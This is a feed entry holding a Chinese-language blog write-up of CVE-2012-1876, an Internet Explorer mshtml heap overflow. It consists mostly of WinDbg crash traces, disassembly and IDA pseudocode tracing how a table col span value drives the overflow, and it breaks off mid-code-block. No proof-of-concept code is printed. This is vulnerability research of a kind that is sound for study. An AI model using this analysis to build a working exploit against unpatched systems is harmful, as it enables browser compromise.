      &lt;p&gt;从备份失败的老博客还原出来的&lt;br&gt;
    
    </summary>
    
    
      <category term="old_blog" scheme="https://vsane.github.io/tags/old-blog/"/>
    
      <category term="browser" scheme="https://vsane.github.io/tags/browser/"/>
    
      <category term="vuln" scheme="https://vsane.github.io/tags/vuln/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2012-1876</title>
    <link href="https://vsane.github.io/2019/01/09/CVE-2012-1876/"/>
    <id>https://vsane.github.io/2019/01/09/CVE-2012-1876/</id>
    <published>2019-01-09T07:50:11.000Z</published>
    <updated>2019-01-09T09:15:44.737Z</updated>
    
    <content type="html"><![CDATA[<p>从备份失败的老博客还原出来的<br><a id="more"></a></p><h2 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h2><p>开启 <code>hpa</code> 后打开 <code>poc</code>, <code>windbg</code> 附加进行进程，查看崩溃原因。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">0:013&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6c020000 6c0d2000   C:\Windows\System32\jscript.dll</span><br><span class="line">(854.5fc): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=00000009 ebx=00414114 ecx=04141149 edx=00004141 esi=07ddf000 edi=07ddf018</span><br><span class="line">eip=68980a2f esp=0462b9c8 ebp=0462b9d4 iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol+0x15:</span><br><span class="line">68980a2f 890f            mov     dword ptr [edi],ecx  ds:0023:07ddf018=????????</span><br><span class="line">0:005&gt; kb</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line">0462b9d4 687ef47a 00414114 0462bd20 00000001 mshtml!CTableColCalc::AdjustForCol+0x15</span><br><span class="line">0462ba8c 6865a6b8 00000001 0462bd20 000003e8 mshtml!CTableLayout::CalculateMinMax+0x558</span><br><span class="line">0462bca8 68650879 0462bd20 0462bcec 00000001 mshtml!CTableLayout::CalculateLayout+0x276</span><br><span class="line">0462be54 6875566c 0462d4c8 0462c080 00000000 mshtml!CTableLayout::CalcSizeVirtual+0x720</span><br><span class="line">0462bf8c 687518f9 07d9aea8 00000000 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class="line">0462c050 68751646 07d9aea8 00013628 00013628 mshtml!CFlowLayout::MeasureSite+0x312</span><br><span class="line">0462c098 687519c1 07724f00 00000061 0462d4c8 mshtml!CFlowLayout::GetSiteWidth+0x156</span><br><span class="line">0462c0d8 68751f70 05568fb0 07d9aea8 00000001 mshtml!CLSMeasurer::GetSiteWidth+0xce</span><br><span class="line">0462c15c 6e17665d 07654ff8 0462c17c 0462c240 mshtml!CEmbeddedILSObj::Fmt+0x150</span><br><span class="line">0462c1ec 6e176399 0763cefc 00000000 07640d20 msls31!ProcessOneRun+0x3e9</span><br><span class="line">0462c248 6e176252 0763cf18 00013fe0 00000000 msls31!FetchAppendEscCore+0x18e</span><br><span class="line">0462c29c 6e1761c3 00000000 00000000 00000014 msls31!LsDestroyLine+0x47f</span><br><span class="line">0462c324 6e17293f 00000007 00002e87 00000000 msls31!LsDestroyLine+0x9ff</span><br><span class="line">0462c360 6874f95e 00000001 00000007 00002e87 msls31!LsCreateLine+0xcb</span><br><span class="line">0462c4b0 68760d1e 0462d4c8 00000007 05568fc0 mshtml!CLSMeasurer::LSDoCreateLine+0x127</span><br><span class="line">0462c554 68761367 0462cdb8 00013628 00000000 mshtml!CLSMeasurer::LSMeasure+0x34</span><br><span class="line">0462c59c 68761223 00000000 00013df8 00000083 mshtml!CLSMeasurer::Measure+0x1e6</span><br><span class="line">0462c5c0 68762d7e 00013df8 00000083 07724f40 mshtml!CLSMeasurer::MeasureLine+0x1c</span><br><span class="line">0462c670 6876b89e 0462cb90 077b8fd8 00000083 mshtml!CRecalcLinePtr::MeasureLine+0x46d</span><br><span class="line">0462ce78 6876b1f1 0462d4c8 00000007 0000000e mshtml!CDisplay::RecalcLines+0x8bb</span><br><span class="line">0462cfc8 6876b034 0462d4c8 00000007 0000000e mshtml!CDisplay::UpdateView+0x208</span><br><span class="line">0462d07c 6876af8b 0462d4c8 0462d600 06f55f10 mshtml!CFlowLayout::CommitChanges+0x9c</span><br><span class="line">0462d18c 6864a711 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcTextSize+0x30f</span><br><span class="line">0462d414 6875adf6 07724f00 0462d600 00000000 mshtml!CFlowLayout::CalcSizeCoreCompat+0x1045</span><br><span class="line">0462d430 68763651 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcSizeCore+0x49</span><br><span class="line">0462d46c 6875ada4 0462d4c8 0462d600 00000000 mshtml!CBodyLayout::CalcSizeCore+0xd8</span><br><span class="line">0462d4a4 6875566c 0462d4c8 0462d600 00000000 mshtml!CFlowLayout::CalcSizeVirtual+0x1af</span><br><span class="line">0462d5dc 686f82bd 07724f00 00000001 00000000 mshtml!CLayout::CalcSize+0x2b8</span><br><span class="line">0462d6cc 68765964 00100000 00000007 069eaeb4 mshtml!CFlowLayout::DoLayout+0x543</span><br><span class="line">0462d708 68748bd8 069ea870 00100000 0462d768 mshtml!CView::ExecuteLayoutTasks+0x3b</span><br><span class="line">0462d74c 686d3acd 00000000 0462d79c 0000003e mshtml!CView::EnsureView+0x355</span><br><span class="line">0462d774 687293c2 069ea870 00000000 06888d58 mshtml!CView::EnsureViewCallback+0xd3</span><br><span class="line">0462d7a8 6871e012 0462d844 00008002 00000000 mshtml!GlobalWndOnMethodCall+0xff</span><br><span class="line">0462d7c8 75dfc4e7 00040276 00000012 00000000 mshtml!GlobalWndProc+0x10c</span><br><span class="line">0462d7f4 75dfc5e7 68706853 00040276 00008002 USER32!InternalCallWinProc+0x23</span><br><span class="line">0462d86c 75dfcc19 00000000 68706853 00040276 USER32!UserCallWinProcCheckWow+0x14b</span><br><span class="line">0462d8cc 75dfcc70 68706853 00000000 0462f9ec USER32!DispatchMessageWorker+0x35e</span><br><span class="line">0462d8dc 6cd94bec 0462d904 00000000 017aef58 USER32!DispatchMessageW+0xf</span><br><span class="line">0462f9ec 6cda4f62 047adfe0 00000000 0168aff0 IEFRAME!CTabWindow::_TabWindowThreadProc+0x54b</span><br><span class="line">0462faa4 75775c2b 017aef58 00000000 0462fac0 IEFRAME!LCIETab_ThreadProc+0x2c1</span><br><span class="line">0462fab4 76023c45 0168aff0 0462fb00 771d37f5 iertutil!CIsoScope::RegisterThread+0xab</span><br><span class="line">0462fac0 771d37f5 0168aff0 71861b5a 00000000 kernel32!BaseThreadInitThunk+0xe</span><br><span class="line">0462fb00 771d37c8 75775c1d 0168aff0 00000000 ntdll!__RtlUserThreadStart+0x70</span><br><span class="line">0462fb18 00000000 75775c1d 0168aff0 00000000 ntdll!_RtlUserThreadStart+0x1b</span><br></pre></td></tr></table></figure></p><p>然后看下 <code>edi</code> 指向的内存信息。<br><img src="http://static.zybuluo.com/dane909/5qb5t5o7q8b0gpqk1erlaxpa/QQ%E6%88%AA%E5%9B%BE20180714101436.png" alt="QQ截图20180714101436.png-26.2kB"><br>由上面的调试信息可知发生了堆溢出。</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>下面来看下造成崩溃的 <code>edi</code> 来自哪里，先从崩溃的函数分析。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; uf mshtml!CTableColCalc::AdjustForCol</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">68980a1a 8bff            mov     edi,edi</span><br><span class="line">68980a1c 55              push    ebp</span><br><span class="line">68980a1d 8bec            mov     ebp,esp</span><br><span class="line">68980a1f 8b08            mov     ecx,dword ptr [eax]</span><br><span class="line">68980a21 53              push    ebx</span><br><span class="line">68980a22 8b5d08          mov     ebx,dword ptr [ebp+8]</span><br><span class="line">68980a25 57              push    edi</span><br><span class="line">68980a26 8bc1            mov     eax,ecx</span><br><span class="line">68980a28 83e00f          and     eax,0Fh</span><br><span class="line">68980a2b 8d7e18          lea     edi,[esi+18h]</span><br><span class="line">68980a2e 50              push    eax</span><br><span class="line">68980a2f 890f            mov     dword ptr [edi],ecx</span><br><span class="line">68980a31 e8d3c3daff      call    mshtml!CUnitValue::IsScalerUnit (6872ce09)</span><br><span class="line">68980a36 85c0            test    eax,eax</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>如上，<code>edi=esi+18h</code>，但是这个函数并没有对 <code>esi</code> 的处理，猜测在上一层函数。即函数 <code>mshtml!CTableLayout::CalculateMinMax</code>。根据 <code>ida</code> 的代码交叉引用功能可以找打调用 <code>CTableColCalc::AdjustForCol</code> 地址。<br><img src="http://static.zybuluo.com/dane909/gub02acj9jhm9cafrztw062d/QQ%E6%88%AA%E5%9B%BE20180714103720.png" alt="QQ截图20180714103720.png-9.6kB"></p><p><img src="http://static.zybuluo.com/dane909/2bybsboz0u630p78huyjtg2b/QQ%E6%88%AA%E5%9B%BE20180714104017.png" alt="QQ截图20180714104017.png-87.1kB"><br>回溯发现静态分析是没法得到具体信息的，在函数 <code>mshtml!CTableLayout::CalculateMinMax</code> 下断进行调试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0:013&gt; .childdbg 1</span><br><span class="line">Processes created by the current process will be debugged</span><br><span class="line">0:013&gt; bu mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">0:013&gt; bl</span><br><span class="line"> 0 e 69dba078     0001 (0001)  0:**** mshtml!CTableLayout::CalculateMinMax</span><br><span class="line">0:013&gt; g</span><br><span class="line">ModLoad: 6c6e0000 6c792000   C:\Windows\System32\jscript.dll</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">eax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85c</span><br><span class="line">eip=69dba078 esp=0466c600 ebp=0466c818 iopl=0         nv up ei pl zr na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax:</span><br><span class="line">69dba078 8bff            mov     edi,edi</span><br><span class="line">0:005&gt; p</span><br><span class="line">...</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85c</span><br><span class="line">eip=69dba084 esp=0466c560 ebp=0466c5fc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xc:</span><br><span class="line">69dba084 8b5d08          mov     ebx,dword ptr [ebp+8] ss:0023:0466c604=07c52ea8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=00000000 edi=0466c85c</span><br><span class="line">eip=69dba087 esp=0466c560 ebp=0466c5fc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xf:</span><br><span class="line">69dba087 56              push    esi</span><br><span class="line">0:005&gt; ln poi(ebx)</span><br><span class="line">(69cb9960)   mshtml!CTableLayout::`vftable&apos;   |  (69cb9aa0)   mshtml!CTableLayoutBlock::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableLayout::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">...</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=07c52ea8 ecx=00412802 edx=ffffffff esi=0466c890 edi=0466c85c</span><br><span class="line">eip=69dba094 esp=0466c55c ebp=0466c5fc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1c:</span><br><span class="line">69dba094 8b4354          mov     eax,dword ptr [ebx+54h] ds:0023:07c52efc=00000001</span><br><span class="line">...</span><br><span class="line">0:005&gt; dd ebx+0x54 L1</span><br><span class="line">07c52efc  00000001</span><br></pre></td></tr></table></figure></p><p>由调试信息可以猜到这个是在 <code>table</code> 元素建立过程中，<code>ebx+54h</code> 存储的值为1，并且在 <code>poc</code> 中 <code>span=  1</code>，两者之间有什么关系呢，下面我们在 <code>poc</code> 中增加一行，如下<br><img src="http://static.zybuluo.com/dane909/oj4o73w8tsp6mtgay033tceg/QQ%E6%88%AA%E5%9B%BE20180714110524.png" alt="QQ截图20180714110524.png-27.2kB"></p><p>继续动态调试可以看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; </span><br><span class="line">eax=00000000 ebx=07af5ea8 ecx=00412802 edx=ffffffff esi=045ac7a0 edi=045ac76c</span><br><span class="line">eip=6809a094 esp=045ac46c ebp=045ac50c iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x1c:</span><br><span class="line">6809a094 8b4354          mov     eax,dword ptr [ebx+54h] ds:0023:07af5efc=0000000a</span><br><span class="line">0:005&gt; dd ebx+0x54 L1</span><br><span class="line">07af5efc  0000000a</span><br></pre></td></tr></table></figure></p><p>如上我们可以猜测 <code>CTableLayout</code> 对象偏移 <code>0x54</code> 处存储的是 <code>table</code> 标签里 <code>span</code> 元素的总和。在看了 <code>kk</code> 前辈的分析后，发现偏移 <code>0x84</code> 处存储的是是一个数组 <code>TableElementArray</code>，数组成员为 <code>&lt;table&gt;</code> 标签的中的元素在内存中的对象。调试信息如下，至于为什么两个 <code>col</code> 元素但是实际内存中两个后面还有重复的我也不知道<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd poi(ebx+84)</span><br><span class="line">0703efd8  06be8fd0 0712afd0 0712afd0 0712afd0</span><br><span class="line">0703efe8  0712afd0 0712afd0 0712afd0 0712afd0</span><br><span class="line">0703eff8  0712afd0 0712afd0 ???????? ????????</span><br><span class="line">0703f008  ???????? ???????? ???????? ????????</span><br><span class="line">0703f018  ???????? ???????? ???????? ????????</span><br><span class="line">0703f028  ???????? ???????? ???????? ????????</span><br><span class="line">0703f038  ???????? ???????? ???????? ????????</span><br><span class="line">0703f048  ???????? ???????? ???????? ????????</span><br><span class="line">0:005&gt; ln poi(06be8fd0)</span><br><span class="line">(6801a1d0)   mshtml!CTableCol::`vftable&apos;   |  (67f96b18)   mshtml!CTableSection::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableCol::`vftable&apos; = &lt;no type information&gt;</span><br><span class="line">0:005&gt; ln poi(0712afd0)</span><br><span class="line">(6801a1d0)   mshtml!CTableCol::`vftable&apos;   |  (67f96b18)   mshtml!CTableSection::`vftable&apos;</span><br><span class="line">Exact matches:</span><br><span class="line">    mshtml!CTableCol::`vftable&apos; = &lt;no type information&gt;</span><br></pre></td></tr></table></figure></p><p>在<code>CTableCol</code> 的内存中偏移 0xC 字节处，保存着一个 <code>CAttrArray</code> 对象指针 <code>theTableColAttrArray</code> 。在 <code>theTableColAttrArray</code> 对象内存偏移 <code>0xC</code> 字节处，是一块 0x40<br>字节大小的缓冲区 <code>theTableColAttrInfoBuffer</code>,用于保存 <code>&lt;col&gt;</code>元素属性的信息，如下。<br><img src="http://static.zybuluo.com/dane909/g25qfgzy4fykn5t78ye5bott/QQ%E6%88%AA%E5%9B%BE20180714113957.png" alt="QQ截图20180714113957.png-10.4kB"><br>实际上我们可以先跟踪哪个函数进行了堆的分配。<br><img src="http://static.zybuluo.com/dane909/nfy090xfjmna8xe3ssq5evja/QQ%E6%88%AA%E5%9B%BE20180714115734.png" alt="QQ截图20180714115734.png-17.9kB"><br>如上，可知函数 <code>mshtml!CImplAry::EnsureSizeWorker</code> 完成了堆的分配，<br>后续调试发现<code>CTableLayout</code>偏移 <code>0x90</code> 处存在一个用来与 <code>span</code> 的值进行比较的数。<br><img src="http://static.zybuluo.com/dane909/6k7w47diofer76gpzrpvd0vr/QQ%E6%88%AA%E5%9B%BE20180714115446.png" alt="QQ截图20180714115446.png-22.9kB"><br>之后在 <code>mshtml!CTableLayout::CalculateMinMax</code> 函数调用了 <code>mshtml!CImplAry::EnsureSizeWorker</code>。跟进<code>mshtml!CImplAry::EnsureSizeWorker</code>。<br>发现其调用了 <code>ULongLongToUInt</code>。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __userpurge ULongLongToUInt@&lt;eax&gt;(_DWORD *a1@&lt;eax&gt;, <span class="keyword">unsigned</span> __int64 a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0xFFFFFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = <span class="number">-1</span>;</span><br><span class="line">    result = <span class="number">-2147024362</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = a2;</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到当第一个参数大于<code>0xFFFFFFFF</code>结果为负值，小于为0，现在传入的为 <code>0x70</code>,故函数执行完成后 <code>eax=0</code>。下面是 <code>mshtml!CImplAry::EnsureSizeWorker</code> 这个函数的注释。<br><img src="http://static.zybuluo.com/dane909/1mdxcyom9jsvtdfuzsmfnbey/2018-07-14_122322.png" alt="2018-07-14_122322.png-83.5kB"><br>跟进函数 <code>_HeapRealloc</code> 发现堆分配的地址保存在 <code>CTableLayout</code> 偏移0x9c处。<br><img src="http://static.zybuluo.com/dane909/ka1p99xec33wshzfh1vmk2om/QQ%E6%88%AA%E5%9B%BE20180714123321.png" alt="QQ截图20180714123321.png-50.6kB"><br>执行完 <code>mshtml!CTableLayout::CalculateMinMax</code> 函数后发现并没有崩溃，所以还存在另一次调用，继续运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=0824cea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0468bd54</span><br><span class="line">eip=6809a084 esp=0468ba58 ebp=0468baf4 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xc:</span><br><span class="line">6809a084 8b5d08          mov     ebx,dword ptr [ebp+8] ss:0023:0468bafc=0824cea8</span><br><span class="line">0:005&gt; </span><br><span class="line">eax=ffffffff ebx=0824cea8 ecx=00402c02 edx=ffffffff esi=00000000 edi=0468bd54</span><br><span class="line">eip=6809a087 esp=0468ba58 ebp=0468baf4 iopl=0         nv up ei pl nz ac pe nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216</span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0xf:</span><br><span class="line">6809a087 56              push    esi</span><br><span class="line">0:005&gt; dd ebx+0x54 L1</span><br><span class="line">0824cefc  00000001</span><br><span class="line">0:005&gt; dd ebx+0x94 L1</span><br><span class="line">0824cf3c  00000004</span><br></pre></td></tr></table></figure></p><p>可以看到和上一次相比 <code>ebx+0x94</code> 处的值变成了4，什么时候变的???好像不知道。在 <code>over_trigger</code> 函数里我们已经把 <code>span</code> 的值改成了 <code>1000</code>,但现在还没有变动，说明下面会改动这个值，设置内存断点，观察什么时候会改动。<br><img src="http://static.zybuluo.com/dane909/jqono2jmfs21xxratn37ehmx/QQ%E6%88%AA%E5%9B%BE20180714131942.png" alt="QQ截图20180714131942.png-6.8kB"><br>直接崩溃了，说明并没有对 <code>CTableLayout</code> 的 <code>span</code> 的值做处理。还有在 <code>mshtml!CImplAry::EnsureSizeWorker</code> 下断点并没有停下，说明<code>ebx+0x94</code>的值右移2后和1相等，跳转走了，并没有执行<code>mshtml!CImplAry::EnsureSizeWorker</code> 去分配堆。好像下面没法分析啦，因为崩溃点在 <code>CTableColCalc::AdjustForCol</code> 函数里，所以我们在 <code>mshtml!CTableLayout::CalculateMinMax</code> 调用 <code>CTableColCalc::AdjustForCol</code> 函数前加一个断点，观察参数。实际上并没有直接断在 <code>call</code> 处，为了更清楚的观察，断在了其之前的指令。主要处理指令如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mshtml!CTableLayout::CalculateMinMax+0x519:</span><br><span class="line">6822f43b 8b839c000000    mov     eax,dword ptr [ebx+9Ch] ;存放的是开辟的堆的地址</span><br><span class="line">6822f441 03c1            add     eax,ecx                 ;堆的地址加上之前已经处理的偏移</span><br><span class="line">6822f443 837de400        cmp     dword ptr [ebp-1Ch],0   ;相等</span><br><span class="line">6822f447 8945d8          mov     dword ptr [ebp-28h],eax </span><br><span class="line">6822f44a 741a            je      mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466) ;跳转</span><br><span class="line"></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x52a:</span><br><span class="line">6822f44c 8b4510          mov     eax,dword ptr [ebp+10h]</span><br><span class="line">6822f44f 83f801          cmp     eax,1</span><br><span class="line">6822f452 7e12            jle     mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466)</span><br><span class="line"></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x532:</span><br><span class="line">6822f454 48              dec     eax</span><br><span class="line">6822f455 3945ec          cmp     dword ptr [ebp-14h],eax</span><br><span class="line">6822f458 750c            jne     mshtml!CTableLayout::CalculateMinMax+0x544 (6822f466)</span><br><span class="line"></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x538:</span><br><span class="line">6822f45a 0faf45f4        imul    eax,dword ptr [ebp-0Ch]</span><br><span class="line">6822f45e 8b4dd0          mov     ecx,dword ptr [ebp-30h]</span><br><span class="line">6822f461 2bc8            sub     ecx,eax</span><br><span class="line">6822f463 894df4          mov     dword ptr [ebp-0Ch],ecx</span><br><span class="line"></span><br><span class="line">mshtml!CTableLayout::CalculateMinMax+0x544:</span><br><span class="line">6822f466 ff75c0          push    dword ptr [ebp-40h]</span><br><span class="line">6822f469 8b45cc          mov     eax,dword ptr [ebp-34h]</span><br><span class="line">6822f46c ff750c          push    dword ptr [ebp+0Ch]</span><br><span class="line">6822f46f 8b75d8          mov     esi,dword ptr [ebp-28h] ;堆的地址加上之前已经处理过的偏移</span><br><span class="line">6822f472 ff75f4          push    dword ptr [ebp-0Ch]</span><br><span class="line">6822f475 e8a0151900      call    mshtml!CTableColCalc::AdjustForCol (683c0a1a)</span><br><span class="line">6822f47a ff45ec          inc     dword ptr [ebp-14h] ;最开始为0 每执行一次AdjustForCol函数会加1</span><br><span class="line">6822f47d 8b45ec          mov     eax,dword ptr [ebp-14h]</span><br><span class="line">6822f480 8345dc1c        add     dword ptr [ebp-24h],1Ch ; ebp-24h 存放的是传入AdjustForCol函数的offset最开始为0 每执行一次加1c</span><br><span class="line">6822f484 3b4510          cmp     eax,dword ptr [ebp+10h] ; ebp+10存放的值为3e8即1000,所以可以发现会循环调用1000次AdjustForCol函数</span><br><span class="line">6822f487 7caf            jl      mshtml!CTableLayout::CalculateMinMax+0x516 (6822f438)</span><br></pre></td></tr></table></figure></p><p>所以现在还剩下 <code>ebp-c</code> 指向的值是什么还不确定，继续设置内存断点，观察 <code>ebp-c</code> 值的变化(好像又失败了???我操作有问题???)。<br>最后发现 <code>ida</code>显示那个值的类型是 <code>struct CWidthUnitValue *</code> ，所以在查看调用的函数后发现可能是调用 <code>CWidthUnitValue::GetPixelWidth</code> 函数的返回值，加断点观察下。<br><img src="http://static.zybuluo.com/dane909/cg8zwsftoaffweixuhob9qvs/QQ%E6%88%AA%E5%9B%BE20180714145803.png" alt="QQ截图20180714145803.png-90.7kB"><br>跟进函数 <code>CWidthUnitValue::GetPixelWidth</code>。算了，不跟了，跟不动，结果是因为 <code>0x0414114=42765*100</code>。所以来继续分析 <code>AdjustForCol</code> 函数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 